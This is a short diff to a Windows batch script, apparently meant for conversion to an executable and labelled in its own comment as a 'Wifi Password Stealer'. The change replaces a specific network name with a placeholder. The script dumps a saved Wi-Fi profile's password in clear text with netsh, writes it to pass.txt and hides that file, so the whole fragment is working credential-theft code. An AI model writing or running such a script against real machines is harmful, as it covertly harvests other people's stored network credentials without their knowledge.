@@ -18,5 +18,5 @@ REM BFCPEOPTIONEND
 @ECHO ON
 @echo off
 ::Wifi Password Stealer::
-netsh wlan show profiles "TP-LINK_4D48" key=clear > pass.txt
+netsh wlan show profiles "Wifi-Name" key=clear > pass.txt
 attrib +h pass.txt
